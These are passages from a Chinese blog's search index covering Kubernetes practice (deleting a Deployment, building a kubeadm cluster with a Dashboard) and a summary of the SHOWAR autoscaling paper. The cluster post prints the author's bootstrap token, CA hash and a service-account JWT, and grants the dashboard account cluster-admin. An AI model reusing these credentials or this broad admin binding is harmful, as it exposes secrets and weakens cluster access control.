和滚动升级一样，回滚过程中也同时存在新旧版本的应用。由于回滚是命令操作，没有使用到deploy.yaml文件，因此要注意应用版本与部署文件中镜像版本不一致的问题，可以手动更改部署文件。\n删除Deployment和Service 不再使用该Service和Pod时，将这两个对象删除，使用命令：kubectl delete -f。\nroot@lzl-a:/home/lzl/WP/k8s# kubectl delete -f ./deploy/deploy.yaml deployment.apps \u0026#34;hello-deploy\u0026#34; deleted root@lzl-a:/home/lzl/WP/k8s# kubectl delete -f ./service/svc.yaml service \u0026#34;hello-svc\u0026#34; deleted root@lzl-a:/home/lzl/WP/k8s# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hello-deploy-65cbc9474c-7jrwq 1/1 Terminating 0 10m 10.5.1.19 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-98bh2 1/1 Terminating 0 13m 10.5.1.12 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-d4g24 1/1 Terminating 0 13m 10.5.1.13 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-hkr5r 1/1 Terminating 0 12m 10.5.1.15 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-jdwsr 1/1 Terminating 0 9m19s 10.5.1.21 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-kglhr 1/1 Terminating 0 13m 10.5.1.14 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-n4mqz 1/1 Terminating 0 9m51s 10.5.1.20 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-p7zgs 1/1 Terminating 0 11m 10.5.1.16 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-rqtrg 1/1 Terminating 0 11m 10.5.1.17 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-xxk2n 1/1 Terminating 0 10m 10.5.1.18 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; root@lzl-a:/home/lzl/WP/k8s# kubectl get svc -o wide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 20h \u0026lt;none\u0026gt; root@lzl-a:/home/lzl/WP/k8s# kubectl get pods -o wide No resources found in default namespace. ","date":"2022-01-21T18:28:33+08:00","permalink":"https://lizonglingo.github.io/p/pod%E5%92%8Cdeployment%E7%9A%84%E4%BD%BF%E7%94%A8k8s%E5%AE%9E%E8%B7%B5-3/","title":"Pod和Deployment的使用(k8s实践-3)"},{"content":" 本节的目标是：搭建含有一个Master Node和两个Work Node的k8s集群，创建一个admin用户并通过token访问kubernetes dashboard。\n具体步骤如下。\n启动k8主节点 将两个work节点加入集群 安装dashboard组件 创建集群管理员用户 获取token并登入dashboard 启动Master Node 启动主节点 该部分参照第一节启动k8s的主节点(k8s实践-1) - Big Carrot (lizonglin313.github.io)，将集群的主节点启动。\nroot@lzl:/home/lzl# kubeadm init --kubernetes-version=v1.22.4 --pod-network-cidr=10.5.0.0/16 --ignore-preflight-errors=Swap [init] Using Kubernetes version: v1.22.4 [preflight] Running pre-flight checks [preflight] Pulling images required for setting up a Kubernetes cluster [preflight] This might take a minute or two, depending on the speed of your internet connection [preflight] You can also perform this action in beforehand using \u0026#39;kubeadm config images pull\u0026#39; [certs] Using certificateDir folder \u0026#34;/etc/kubernetes/pki\u0026#34; [certs] Generating \u0026#34;ca\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver\u0026#34; certificate and key [certs] apiserver serving cert is signed for DNS names [kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local lzl] and IPs [10.96.0.1 192.168.230.11] [certs] Generating \u0026#34;apiserver-kubelet-client\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-ca\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-client\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/ca\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/server\u0026#34; certificate and key [certs] etcd/server serving cert is signed for DNS names [localhost lzl] and IPs [192.168.230.11 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/peer\u0026#34; certificate and key [certs] etcd/peer serving cert is signed for DNS names [localhost lzl] and IPs [192.168.230.11 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/healthcheck-client\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver-etcd-client\u0026#34; certificate and key [certs] Generating \u0026#34;sa\u0026#34; key and public key [kubeconfig] Using kubeconfig folder \u0026#34;/etc/kubernetes\u0026#34; [kubeconfig] Writing \u0026#34;admin.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;kubelet.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;controller-manager.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;scheduler.conf\u0026#34; kubeconfig file [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Starting the kubelet [control-plane] Using manifest folder \u0026#34;/etc/kubernetes/manifests\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-apiserver\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-controller-manager\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-scheduler\u0026#34; [etcd] Creating static Pod manifest for local etcd in \u0026#34;/etc/kubernetes/manifests\u0026#34; [wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory \u0026#34;/etc/kubernetes/manifests\u0026#34;. This can take up to 4m0s [apiclient] All control plane components are healthy after 14.007476 seconds [upload-config] Storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace [kubelet] Creating a ConfigMap \u0026#34;kubelet-config-1.22\u0026#34; in namespace kube-system with the configuration for the kubelets in the cluster [upload-certs] Skipping phase. Please see --upload-certs [mark-control-plane] Marking the node lzl as control-plane by adding the labels: [node-role.kubernetes.io/master(deprecated) node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers] [mark-control-plane] Marking the node lzl as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule] [bootstrap-token] Using token: 1la5tc.rbk7kyfx0g8cvj2n [bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials [bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token [bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster [bootstrap-token] Creating the \u0026#34;cluster-info\u0026#34; ConfigMap in the \u0026#34;kube-public\u0026#34; namespace [kubelet-finalize] Updating \u0026#34;/etc/kubernetes/kubelet.conf\u0026#34; to point to a rotatable kubelet client certificate and key [addons] Applied essential addon: CoreDNS [addons] Applied essential addon: kube-proxy Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config Alternatively, if you are the root user, you can run: export KUBECONFIG=/etc/kubernetes/admin.conf You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.230.11:6443 --token 1la5tc.rbk7kyfx0g8cvj2n \\ --discovery-token-ca-cert-hash sha256:4ba0f32696c7c776a99e7e7afc3f51035d6895b786733eacd27e9cb993567f68 root@lzl:/home/lzl# export KUBECONFIG=/etc/kubernetes/admin.conf 配置集群网络 这里我们使用flannel网络组件作为集群网络。\nroot@lzl:/home/lzl# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+ podsecuritypolicy.policy/psp.flannel.unprivileged created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created serviceaccount/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created root@lzl:/home/lzl# kubectl get componentstatus Warning: v1 ComponentStatus is deprecated in v1.19+ NAME STATUS MESSAGE ERROR scheduler Unhealthy Get \u0026#34;http://127.0.0.1:10251/healthz\u0026#34;: dial tcp 127.0.0.1:10251: connect: connection refused controller-manager Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;\u0026#34;} 查看集群组件状态，发现主节点的scheduler不正常。根据上一个教程，修改scheduler和controller的配置文件中的端口号。\nroot@lzl:/etc/kubernetes/manifests# kubectl get componentstatus Warning: v1 ComponentStatus is deprecated in v1.19+ NAME STATUS MESSAGE ERROR scheduler Healthy ok controller-manager Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;\u0026#34;} root@lzl:/home/lzl# kubectl get nodes NAME STATUS ROLES AGE VERSION lzl Ready control-plane,master 12m v1.22.4 这样三个组件状态正常，主节点启动成功，下面安装Dashboard。\n安装Kubernetes Dashboard root@lzl:/home/lzl# kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml namespace/kubernetes-dashboard created serviceaccount/kubernetes-dashboard created service/kubernetes-dashboard created secret/kubernetes-dashboard-certs created secret/kubernetes-dashboard-csrf created secret/kubernetes-dashboard-key-holder created configmap/kubernetes-dashboard-settings created role.rbac.authorization.k8s.io/kubernetes-dashboard created clusterrole.rbac.authorization.k8s.io/kubernetes-dashboard created rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard created clusterrolebinding.rbac.authorization.k8s.io/kubernetes-dashboard created deployment.apps/kubernetes-dashboard created service/dashboard-metrics-scraper created Warning: spec.template.metadata.annotations[seccomp.security.alpha.kubernetes.io/pod]: deprecated since v1.19; use the \u0026#34;seccompProfile\u0026#34; field instead deployment.apps/dashboard-metrics-scraper created 查看是否能够启动Dashboard，这里使用kubectl proxy命令启动代理服务，然后访问http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/。\nroot@lzl:/home/lzl# kubectl proxy Starting to serve on 127.0.0.1:8001 出现此界面说明Dashboard安装成功并可以启动。\n将Work Node加入集群 工作节点的加入，在工作节点使用启动主节点是给出的命令就可。\n... Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.230.11:6443 --token 1la5tc.rbk7kyfx0g8cvj2n \\ --discovery-token-ca-cert-hash sha256:4ba0f32696c7c776a99e7e7afc3f51035d6895b786733eacd27e9cb993567f68 ... 我的两个工作节点的IP分别为：192.168.230.12和192.168.230.13。\n在加入工作节点时 出现了如下错误：\nroot@lzl-b:/home/lzl# kubeadm join 192.168.230.11:6443 --token 1la5tc.rbk7kyfx0g8cvj2n --discovery-token-ca-cert-hash sha256:4ba0f32696c7c776a99e7e7afc3f51035d6895b786733eacd27e9cb993567f68 [preflight] Running pre-flight checks [preflight] Reading configuration from the cluster... [preflight] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -o yaml\u0026#39; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Starting the kubelet [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... [kubelet-check] Initial timeout of 40s passed. [kubelet-check] It seems like the kubelet isn\u0026#39;t running or healthy. [kubelet-check] The HTTP call equal to \u0026#39;curl -sSL http://localhost:10248/healthz\u0026#39; failed with error: Get \u0026#34;http://localhost:10248/healthz\u0026#34;: dial tcp 127.0.0.1:10248: connect: connection refused. [kubelet-check] It seems like the kubelet isn\u0026#39;t running or healthy. [kubelet-check] The HTTP call equal to \u0026#39;curl -sSL http://localhost:10248/healthz\u0026#39; failed with error: Get \u0026#34;http://localhost:10248/healthz\u0026#34;: dial tcp 127.0.0.1:10248: connect: connection refused. [kubelet-check] It seems like the kubelet isn\u0026#39;t running or healthy. [kubelet-check] The HTTP call equal to \u0026#39;curl -sSL http://localhost:10248/healthz\u0026#39; failed with error: Get \u0026#34;http://localhost:10248/healthz\u0026#34;: dial tcp 127.0.0.1:10248: connect: connection refused. [kubelet-check] It seems like the kubelet isn\u0026#39;t running or healthy. [kubelet-check] The HTTP call equal to \u0026#39;curl -sSL http://localhost:10248/healthz\u0026#39; failed with error: Get \u0026#34;http://localhost:10248/healthz\u0026#34;: dial tcp 127.0.0.1:10248: connect: connection refused. [kubelet-check] It seems like the kubelet isn\u0026#39;t running or healthy. [kubelet-check] The HTTP call equal to \u0026#39;curl -sSL http://localhost:10248/healthz\u0026#39; failed with error: Get \u0026#34;http://localhost:10248/healthz\u0026#34;: dial tcp 127.0.0.1:10248: connect: connection refused. error execution phase kubelet-start: error uploading crisocket: timed out waiting for the condition To see the stack trace of this error execute with --v=5 or higher 然后进行排错，出错原因可能有以下：\n有说是因为docker的cgroup驱动设置的问题：https://blog.csdn.net/imonkeyi/article/details/120452471 没有关闭主机swap也会产生问题 按照我上一篇的文章的前置环境和上述博文进行设置，关闭swap分区并设置docker的cgroup驱动，成功解决，直接使用k8s master节点的给出的提示命令就可以将work节点加入集群。\n所以需要注意，工作节点加入集群的前置条件是（可能不完整）：\n必须需安装kubelet、kubeadm 关闭swap分区 设置好docker的cgroup驱动 然后使用kubeadm reset将环境重置，重新将工作节点加入集群。\nroot@lzl-b:/home/lzl# kubeadm reset [reset] WARNING: Changes made to this host by \u0026#39;kubeadm init\u0026#39; or \u0026#39;kubeadm join\u0026#39; will be reverted. [reset] Are you sure you want to proceed? [y/N]: y [preflight] Running pre-flight checks W0117 19:06:49.180263 37850 removeetcdmember.go:80] [reset] No kubeadm config, using etcd pod spec to get data directory [reset] No etcd config found. Assuming external etcd [reset] Please, manually reset etcd to prevent further issues [reset] Stopping the kubelet service [reset] Unmounting mounted directories in \u0026#34;/var/lib/kubelet\u0026#34; [reset] Deleting contents of config directories: [/etc/kubernetes/manifests /etc/kubernetes/pki] [reset] Deleting files: [/etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /etc/kubernetes/bootstrap-kubelet.conf /etc/kubernetes/controller-manager.conf /etc/kubernetes/scheduler.conf] [reset] Deleting contents of stateful directories: [/var/lib/kubelet /var/lib/dockershim /var/run/kubernetes /var/lib/cni] The reset process does not clean CNI configuration. To do so, you must remove /etc/cni/net.d The reset process does not reset or clean up iptables rules or IPVS tables. If you wish to reset iptables, you must do so manually by using the \u0026#34;iptables\u0026#34; command. If your cluster was setup to utilize IPVS, run ipvsadm --clear (or similar) to reset your system\u0026#39;s IPVS tables. The reset process does not clean your kubeconfig files and you must remove them manually. Please, check the contents of the $HOME/.kube/config file. root@lzl-b:/home/lzl# kubeadm join 192.168.230.11:6443 --token 1la5tc.rbk7kyfx0g8cvj2n --discovery-token-ca-cert-hash sha256:4ba0f32696c7c776a99e7e7afc3f51035d6895b786733eacd27e9cb993567f68 [preflight] Running pre-flight checks [preflight] Reading configuration from the cluster... [preflight] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -o yaml\u0026#39; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Starting the kubelet [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... This node has joined the cluster: * Certificate signing request was sent to apiserver and a response was received. * The Kubelet was informed of the new secure connection details. Run \u0026#39;kubectl get nodes\u0026#39; on the control-plane to see this node join the cluster. 依次加入两个工作节点lzl-b和lzl-c，然后在主节点查看集群节点信息:\nroot@lzl:/home/lzl# kubectl get nodes NAME STATUS ROLES AGE VERSION lzl Ready control-plane,master 110m v1.22.4 lzl-b Ready \u0026lt;none\u0026gt; 21m v1.22.4 lzl-c Ready \u0026lt;none\u0026gt; 10m v1.22.4 然后验证整个集群的工作状态：\nroot@lzl:/home/lzl# kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE kube-system coredns-78fcd69978-7fspq 1/1 Running 0 110m kube-system coredns-78fcd69978-7vffp 1/1 Running 0 110m kube-system etcd-lzl 1/1 Running 0 111m kube-system kube-apiserver-lzl 1/1 Running 0 111m kube-system kube-controller-manager-lzl 1/1 Running 0 100m kube-system kube-flannel-ds-mjxd8 1/1 Running 0 105m kube-system kube-flannel-ds-r7s7c 1/1 Running 0 11m kube-system kube-flannel-ds-wjsz4 1/1 Running 0 22m kube-system kube-proxy-4n6xk 1/1 Running 0 11m kube-system kube-proxy-w7vl7 1/1 Running 0 22m kube-system kube-proxy-xw6c9 1/1 Running 0 110m kube-system kube-scheduler-lzl 1/1 Running 0 101m kubernetes-dashboard dashboard-metrics-scraper-856586f554-2snbz 1/1 Running 0 94m kubernetes-dashboard kubernetes-dashboard-78c79f97b4-j6k9r 1/1 Running 0 94m 至此就使用kubeadm成功搭建了一个主节点和两个工作节点的集群，如果安装失败可以使用kubeadm reset命令将主机恢复，然后重新安装。\n配置Kubernetes Dashboard 如果想在k8s中使用Dashboard对集群状态进行监控等操作，需要创建用户，这里结合以下三个示例：\nhttps://github.com/kubernetes/dashboard/blob/master/docs/user/access-control/creating-sample-user.md\nhttps://jimmysong.io/kubernetes-handbook/guide/auth-with-kubeconfig-or-token.html\nhttps://andrewpqc.github.io/2018/04/25/k8s-dashboard-auth/\n创建用户角色的文件如下，创建一个ServiceAccount然后将该账户绑定到cluster权限上。\napiVersion: v1 kind: ServiceAccount metadata: name: admin-user namespace: kubernetes-dashboard --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: admin-user roleRef: # \u0026#34;roleRef\u0026#34; 指定与某 Role 或 ClusterRole 的绑定关系 apiGroup: rbac.authorization.k8s.io kind: ClusterRole # 此字段必须是 Role 或 ClusterRole name: cluster-admin # 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配 subjects: - kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard 下面创建用户并获取用户的token，进行dashboard的登录。\nroot@lzl:/home/lzl# kubectl create -f admin-role.yaml serviceaccount/admin-user created clusterrolebinding.rbac.authorization.k8s.io/admin-user created root@lzl:/home/lzl# kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=\u0026#34;{.secrets[0].name}\u0026#34;) -o go-template=\u0026#34;{{.data.token | base64decode}}\u0026#34; eyJhbGciOiJSUzI1NiIsImtpZCI6Ild5MHVweWVackR5b1RYcUFKLWgwUlBKTG9UVFM3U2pIMWYzRFJ1Mi1kUm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWprMjhoIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJjN2Y0NzkwZC03YWZlLTRiYWUtOWI0OC0wOTFkZTE4ZjVhYTYiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.fmSCJRpiFCqu36umiT7GFXH3WvNE3O3cLmbrwaljYsI48JZXk35tzr10HPWRNBts9vHaoQOaZxGbWeUvxa51QQNlJEAt0b5fdIahCr9myYTSJZHCUNaS3nftvROv0XIHcLZvLGgJngguChrcOO5XK7-7i1hawBf_d3Xesga-uWS0NYxZR5Fsv_Ponipet4Hkr329EjFs3JD0yTMJEnEpwLnDJioz4KkmPdpE2rZBj65Sc6UxOjZrY3kdSMITj8nWMdKetfm8zbvkt3yxKi88FzBfNOUeUMFxywf4cUiWw-z7v9_pSU6xjkK7-P_9LxiaDHW0ZrfYoXEPf6oLVpR1EQ root@lzl:/home/lzl# kubectl proxy Starting to serve on 127.0.0.1:8001 再次打开dashboard界面，输入token登录。\n已经有正常的资源信息显示了。\n至此，我们已经搭建了包含一个master节点和两个work节点的k8s集群，并且可以通过创建的角色访问dashboard来管理集群资源了。\n相关参考 Kubernetes Dashboard项目Github主页 Dashboard-Creating sample user k8s-基于角色的访问控制-使用 RBAC 鉴权 ","date":"2022-01-18T17:39:01+08:00","permalink":"https://lizonglingo.github.io/p/%E6%90%AD%E5%BB%BA1%E4%B8%AAmaster%E8%8A%82%E7%82%B9%E5%92%8C2%E4%B8%AAwork%E8%8A%82%E7%82%B9%E7%9A%84%E9%9B%86%E7%BE%A4k8s%E5%AE%9E%E8%B7%B5-2/","title":"搭建1个Master节点和2个Work节点的集群(k8s实践-2)"},{"content":"摘要 提出微服务的面临的一个挑战是为每个微服务找到最佳的分配资源和服务实例的数量。达到保证性能的同时最大限度的提高资源利用率这样一个目标。本文的SHOWAR是一个通过确定服务实例数量（横向扩展）以及每个服务实例的资源如CPU和内存（纵向扩展）来配置资源的框架。\n对于纵向扩展，SHOWAR通过历史资源中的经验方差来寻找最佳资源分配量，保证性能同时减少不必要的资源浪费；对于横向扩展，使用控制理论的基本思想以及内核级性能指标来实施。\n在确定微服务的现有状态后，SHOWAR使用调度程序生成亲和性规则来弥合最佳资源分配和调度之间的差距，实现资源分配和性能提高。\n实验表明，SHOWAR与现有的最先进的自动缩放和调度系统相比，资源分配提高了22%，同时降低了99%的端到端请求延迟20%。\nIntro 本文的SHOWAR是一个用于微服务横向和纵向自动扩展的微服务管理系统，用于Kubernetes编排的微服务系统。\n对于纵向缩放，SHOWAR 依赖历史资源使用情况的差异，找到每个微服务的最佳资源大小，保持良好的性能的同时提高资源利用率。\n对于横向自动缩放，SHOWAR 使用来自 Linux 内核线程调度程序队列的指标（特别是 eBPF 运行时延迟）作为其自动缩放信号，以做出更准确和有意义的自动缩放决策。为了实现这个目标，SHOAWR使用了控制理论的基本思想，基于来自微服务运行时的信号控制每个微服务的副本数量。\n该团队设计了一个比例积分微分proportional–integral–derivative (PID) 控制器作为有状态自动缩放器，它使用历史自动缩放操作和当前运行时测量来做出下一个水平自动缩放决策并保持微服务“稳定”。此外，SHOWAR考虑不同微服务之间的依赖关系，优先考虑被依赖的微服务，以防止不必要的自动缩放操作和低资源利用率。\n除了使用自动缩放器来确定微服务的资源外，SHOWAR还旨在桥接微服务的最佳资源分配和高效调度，在达成最佳资源分配和高效调度之间取得最佳平衡。一旦确定了微服务的最佳大小，SHOWAR就会协助集群调度程序调度微服务以获得更好的端到端性能。为了防止资源争用和管理噪声邻居对微服务性能的影响，SHOWAR使用不同微服务之间历史资源使用情况的估计相关性来为Kubernetes调度程序生成规则。例如，这些规则可能会建议调度程序共同定位（调度亲和性）与某种资源类型具有负相关性的微服务，或者以其他方式分发它们（调度反亲和性）。\n文章通过在AWS公共云上的虚拟机集群部署各种交互式微服务应用程序来评估SHOWAR。将SHOWAR的性能与两种最先进的自动缩放系统进行了比较：Google Autopilot和Kubernetes 默认的自动缩放器。使用实际生产工作负载，结果表明，SHOWAR在有效资源分配和端到端请求延迟的尾部分布方面优于这些参照。SHOWAR 平均将资源分配提高了22%，这可以直接转化为集群相关成本的总节省22%，同时将99%的端到端用户请求延迟降低20%。\n贡献 提出一种自动化的纵向扩容和横向扩容框架，达到保证服务性能的前提下提高资源利用率的目标 提出调度亲和性和反亲和规则，通过生成调度亲和性和反亲和性规则来帮助调度程序更好地放置微服务并提高微服务性能，弥合了适当调整微服务规模以提高资源效率和高效微服务调度之间的差距 通过实验证明SHOWAR的良好表现 前置知识 这一个比较典型的微服务架构示意图，微服务之间的依赖关系错综复杂。其中一些微服务依赖于其他微服务，SHOWAR使用此依赖关系图信息来做出更好的自动缩放决策。\n除了 CPU 和内存使用数据外，SHOWAR还使用扩展的伯克利数据包过滤 ( Berkeley Packet Filtering - eBPF) [6] 指标数据进行水平自动缩放决策。eBPF 是最新的Linux内核技术，它支持在内核级别运行安全且低开销的程序，以从内核级别的事件（例如 CPU 调度程序决策事件、内存分配事件和内核网络堆栈中的数据包事件）中收集准确的指标。它已被广泛用于微服务可观察性，用于性能改进、分析和跟踪、负载平衡、网络监控和安全等广泛目的。\nSHOWAR 系统架构 SHOWAR使用每个节点上的相应代理来收集资源使用日志以及 eBPF 指标，然后聚合到时间序列数据库中。\nSHOWAR使用收集到的指标通过分别与Kubernetes API服务器及其调度程序通信来做出自动缩放决策以及调度亲和性和反亲和性规则。\n系统实现 SHOWAR 作为服务部署在控制器节点并与kubernetes API服务器及其调度程序交互以进行自动缩放操作以及为微服务应用生成的亲和性和反亲和性规则。\n监控代理Monitoring Agents\n监控和日志数据是任何应用程序部署最重要的部分。监控数据用于可观察性、健康检查和自动缩放。本文使用最先进的监控和指标收集工具Prometheus从节点和容器收集不同的指标。Prometheus在集群中的每个节点上启动一个监控代理来收集容器指标，例如 CPU 使用率、内存使用率、网络带宽使用率等。代理被配置为每秒收集和报告指标（一秒是Prometheus 代理可以收集指标的最短时间。为了获得尽可能多的数据点，我们每秒钟收集一次数据）。Prometheus 带有一个时间序列数据库，代理存储收集的指标。此外，提供查询语言来查询其他模块使用的时间序列数据库以利用收集的指标。\n除Prometheus外，文章还开发了一个eBPF程序，该程序作为监控代理部署在集群中的每个节点上，以收集横向自动缩放器使用的 𝑟𝑢𝑛𝑞 𝑙𝑎𝑡𝑒𝑛𝑐𝑦 指标。该指标是每个pod中的CPU线程在获取CPU之前所经历的延迟直方图。程序每1秒收集一张𝑟𝑢𝑛𝑞 𝑙𝑎𝑡𝑒𝑛𝑐𝑖𝑒𝑠的直方图并存储在Prometheus时间序列数据库中。\n纵向缩放器The Vertical Autoscaler\n这一个简单的循环，每分钟进行一轮。在前 5 分钟的窗口内为每种资源类型 𝑟（CPU 和内存）计算 𝑠𝑟 =𝜇𝑟 +3∗𝜎𝑟，如果 𝑠 的值变化超过 15%，它会更新服务的资源需求为𝑠。\n触发缩放器的另一个条件是微服务报告 OOM 错误时。在应用微服务的新资源需求之前，纵向自动缩放器通过共享通道向横向自动缩放器发送消息，不让其进行任何横向自动缩放操作，因为纵向自动缩放操作的优先级高于水平自动缩放。\n如果该微服务的 CPU 数量超过一个 CPU 内核（即 𝑠𝐶𝑃𝑈 \u0026gt;1000𝑚），纵向自动缩放器也不会对微服务进行自动缩放操作，在这种情况下，它会通过另一个共享通道发送消息到横向自动缩放器触发横向自动缩放操作。\n横向缩放器The Horizontal Autoscaler\n横向自动缩放器的核心是一个 PID 控制器，旨在保持每个微服务稳定。对于给定的目标 𝑟𝑢𝑛𝑞 𝑙𝑎𝑡𝑒𝑛𝑐𝑦，它对该微服务执行水平自动缩放操作，使其始终具有𝑟𝑢𝑛𝑞𝑟𝑢𝑛𝑞𝑙控制器每 1 分钟做出决定，eBPF 程序收集 60 个度量直方图实例（每秒 1 个）。对于每个直方图，选择第 95 个百分位数，控制器使用这 60 个数据点的平均值作为其当前观察（也称为测量）来执行其控制操作。每个水平扩展操作添加或删除至少 1 个或可配置百分比（默认为 10%）的微服务当前副本数，分别用于扩展和缩减。PID 控制参数的初始值取为 𝑘𝑃 =𝑘𝐼 =𝑘𝐷 =1/3（每个参数约束为 ∈ [0,10]）。这些参数的增量变化是 10%（我们通过实验发现 10% 的性能非常好）。控制器输出的波动是进行此类更改的基础，使用之前的 𝑁 = 10 个样本进行测量。此外，控制器的“速度”被测量为达到区间 [target(1 −𝛼),target(1 + 𝛼)] 所需的迭代次数，因为 𝛼 =10%。\n亲和规则生成器The Affinity Rule Generator\nSHOWAR的亲和性规则生成器每 5 分钟使用一次 CPU、内存和网络利用率，这是一个由 300 个数据点组成的向量（每个数据点是微服务副本的平均值）来计算每个数据点之间不同资源类型的相关系数。消除弱相关或无相关实例，[−0.8,+0.8] 中的任何值都将被丢弃。其他强负相关和强正相关微服务用于生成亲和性和反亲和性规则。资源使用模式会随着工作负载的变化（也称为工作负载转移）而变化，因此如果在随后的 5 分钟时间窗口内强烈的负相关或正相关变化超过 20%（可配置），SHOWAR 将撤销关联（或anti-affinity）规则。\nSHOWAR的开销\nSHOWAR是作为Kubernetes的控制器构建的，它对于自动缩放器和其他类型的控制器具有高度可插拔性。SHOWAR使用常用的 Kubernetes监控代理（如Prometheus）和一个自定义eBPF指标监控代理。因此，与默认的Kubernetes自动缩放器相比，SHOWAR 不会引入任何额外的开销。此外，自动缩放器被调度在控制器节点上，并且不与调度在工作节点上的应用程序 Pod 